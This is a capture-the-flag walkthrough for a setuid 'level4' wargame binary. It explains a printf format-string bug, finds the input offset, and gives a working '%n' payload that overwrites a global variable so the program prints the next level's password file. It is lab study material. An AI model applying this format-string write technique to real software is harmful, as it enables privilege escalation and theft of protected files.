level4 - walkthrough
====================

Target: /home/user/level4/level4   (setuid + setgid level5)
Goal:   read /home/user/level5/.pass

1. The bug
   n() reads a line and passes it to p(), which does printf(s) with no format
   argument -- a format-string vulnerability. Then:
     if (m == 0x1025544) system("/bin/cat /home/user/level5/.pass");
   `m` is a global at 0x08049810. The cat command is self-contained, so we only
   need to write 0x1025544 into m and the program prints the flag itself.

2. Find our argument position
     $ python -c 'print "AAAA" + ".%x"*15' | ./level4
   0x41414141 appears as the 12th value, so our input is at position 12.

3. Payload  (Ressources/exploit.py)
     payload = p32(0x8049810) + b"%16930112x" + b"%12$n"
   The 4 address bytes print as 4 chars, %16930112x prints 16930112 more ->
   16930116 = 0x1025544 total, and %12$n writes that into m. One big %n instead
   of splitting into two %hn writes -- simpler, just ~16 MB of padding.

4. Run
     $ python3 Ressources/exploit.py
     $ ./level4 < payload | grep -aoE '[0-9a-f]{64}'
   The padding scrolls by, then n() cats the flag; grep pulls it out.

